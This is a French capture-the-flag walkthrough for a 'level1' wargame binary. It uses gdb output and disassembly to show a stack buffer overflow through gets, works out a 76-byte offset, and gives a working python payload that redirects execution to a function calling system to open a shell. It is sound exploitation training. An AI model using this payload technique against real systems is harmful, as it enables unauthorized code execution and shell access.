# Level 1

Apprendre a faire un overflow

## Commandes utiles

```bash
info function
```

## Notion

### Schema de la stack



### Comment fonctionne une stack overflow

## analyse des fonctions

```bash
(gdb) info function
All defined functions:

Non-debugging symbols:
0x080482f8  _init
0x08048340  gets
0x08048340  gets@plt
0x08048350  fwrite
0x08048350  fwrite@plt
0x08048360  system             <-- appelle a une fonction qui peut ouvrir un terminal
0x08048360  system@plt
0x08048370  __gmon_start__
0x08048370  __gmon_start__@plt
0x08048380  __libc_start_main
0x08048380  __libc_start_main@plt
0x08048390  _start
0x080483c0  __do_global_dtors_aux
0x08048420  frame_dummy
0x08048444  run                <-- fonction ecrite dans le code
0x08048480  main
0x080484a0  __libc_csu_init
0x08048510  __libc_csu_fini
0x08048512  __i686.get_pc_thunk.bx
0x08048520  __do_global_ctors_aux
0x0804854c  _fini
```

## analyse du code

```bash
   0x08048480 <+0>:	push   %ebp
   0x08048481 <+1>:	mov    %esp,%ebp
   0x08048483 <+3>:	and    $0xfffffff0,%esp
   0x08048486 <+6>:	sub    $0x50,%esp                <-- 80 octets donne pour la stack
   0x08048489 <+9>:	lea    0x10(%esp),%eax
   0x0804848d <+13>:	mov    %eax,(%esp)
   0x08048490 <+16>:	call   0x8048340 <gets@plt>      <-- fonction qui ne verifie   pas le buffer
   0x08048495 <+21>:	leave  
   0x08048496 <+22>:	ret   
```
de plus on ne voit aucun appel a run

```bash
   0x08048444 <+0>:	push   %ebp
   0x08048445 <+1>:	mov    %esp,%ebp
   0x08048447 <+3>:	sub    $0x18,%esp
   0x0804844a <+6>:	mov    0x80497c0,%eax
   0x0804844f <+11>:	mov    %eax,%edx
   0x08048451 <+13>:	mov    $0x8048570,%eax
   0x08048456 <+18>:	mov    %edx,0xc(%esp)
   0x0804845a <+22>:	movl   $0x13,0x8(%esp)
   0x08048462 <+30>:	movl   $0x1,0x4(%esp)
   0x0804846a <+38>:	mov    %eax,(%esp)
   0x0804846d <+41>:	call   0x8048350 <fwrite@plt>
   0x08048472 <+46>:	movl   $0x8048584,(%esp)
   0x08048479 <+53>:	call   0x8048360 <system@plt>  <-- appel a un terminal
   0x0804847e <+58>:	leave  
   0x0804847f <+59>:	ret 
```
0x08048444 est la tete de notre fonction.

## trouver la taille du buffer pour overflow


### 1e methode
```bash
Starting program: /home/user/level1/level1 
aaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrssssttttuuuuvvvvwwwwxxxxyyyyzzzz

Program received signal SIGSEGV, Segmentation fault.
0x74747474 in ?? ()
```
0x74747474 = "t" (20e lettre)
19 x 4 = 76

### 2e methode

Comme on a trouve que la stack fait 80 bits

80 - 4 = 76

### Conclusion

A partir de 77 notre buffer ecrasera des valeurs de la stack

## Construction de la commande

### Voici le code qui va ouvrir un terminal

```bash
python -c 'print(76 * "y" + "\x44\x84\x04\x08")' > /tmp/cou
```

```bash
cat /tmp/cou - | ./level1
```
## Sources

- Code qui ouvre un terminal : https://shell-storm.org/shellcode/files/shellcode-219.html




